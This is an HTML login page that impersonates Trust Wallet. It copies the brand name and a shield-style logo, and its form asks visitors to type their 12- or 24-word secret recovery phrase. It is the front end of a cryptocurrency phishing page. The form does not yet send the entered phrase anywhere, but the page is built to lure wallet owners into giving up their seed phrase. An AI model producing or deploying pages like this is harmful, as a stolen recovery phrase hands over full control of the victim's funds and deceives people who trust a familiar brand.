<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Trust Wallet - Log In</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    }

    body {
      background-color: #0b0e14;
      color: #ffffff;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
    }

    .login-card {
      background-color: #181d26;
      border: 1px solid #282f3d;
      border-radius: 16px;
      width: 100%;
      max-width: 420px;
      padding: 32px 24px;
      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    .logo-container {
      margin-bottom: 24px;
      text-align: center;
    }

    .logo-icon {
      width: 56px;
      height: 56px;
      background: linear-gradient(135deg, #0500ff 0%, #0038ff 100%);
      border-radius: 14px;
      display: flex;
      justify-content: center;
      align-items: center;
      margin: 0 auto 12px;
      box-shadow: 0 4px 12px rgba(5, 0, 255, 0.3);
    }

    /* Shield SVG shape similar to Trust Wallet */
    .logo-icon svg {
      width: 30px;
      height: 30px;
      fill: #ffffff;
    }

    .title {
      font-size: 22px;
      font-weight: 700;
      margin-bottom: 6px;
    }

    .subtitle {
      font-size: 14px;
      color: #848e9c;
    }

    .form {
      width: 100%;
      margin-top: 24px;
    }

    .input-group {
      margin-bottom: 20px;
    }

    .input-group label {
      display: block;
      font-size: 13px;
      color: #a0a8b6;
      margin-bottom: 8px;
    }

    .input-group input, 
    .input-group textarea {
      width: 100%;
      background-color: #0b0e14;
      border: 1px solid #282f3d;
      border-radius: 10px;
      padding: 12px 14px;
      color: #ffffff;
      font-size: 14px;
      outline: none;
      transition: border-color 0.2s;
    }

    .input-group textarea {
      resize: vertical;
      min-height: 80px;
    }

    .input-group input:focus, 
    .input-group textarea:focus {
      border-color: #0500ff;
    }

    .btn-submit {
      width: 100%;
      background-color: #0500ff;
      color: #ffffff;
      border: none;
      border-radius: 10px;
      padding: 14px;
      font-size: 15px;
      font-weight: 600;
      cursor: pointer;
      transition: background-color 0.2s, transform 0.1s;
    }

    .btn-submit:hover {
      background-color: #0400cc;
    }

    .btn-submit:active {
      transform: scale(0.99);
    }

    /* Footer Section */
    .card-footer {
      margin-top: 28px;
      padding-top: 20px;
      border-top: 1px solid #282f3d;
      width: 100%;
      text-align: center;
      font-size: 14px;
      color: #848e9c;
    }

    .card-footer a {
      color: #3b82f6;
      text-decoration: none;
      font-weight: 600;
      margin-left: 4px;
    }

    .card-footer a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>

  <div class="login-card">
    
    <!-- Logo & Header -->
    <div class="logo-container">
      <div class="logo-icon">
        <svg viewBox="0 0 24 24">
          <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-5.45 9-12V5l-9-4z"/>
        </svg>
      </div>
      <h1 class="title">Access Your Wallet</h1>
      <p class="subtitle">Enter your Secret Phrase or Password</p>
    </div>

    <!-- Login Form -->
    <form class="form" onsubmit="event.preventDefault();">
      <div class="input-group">
        <label for="passphrase">Secret Recovery Phrase / Password</label>
        <textarea id="passphrase" placeholder="Enter your 12 or 24-word phrase or password..." required></textarea>
      </div>

      <button type="submit" class="btn-submit">Import & Log In</button>
    </form>

    <!-- Footer - Create Account Link -->
    <div class="card-footer">
      Don't have a wallet? 
      <a href="#">Create a new wallet</a>
    </div>

  </div>

</body>
</html>
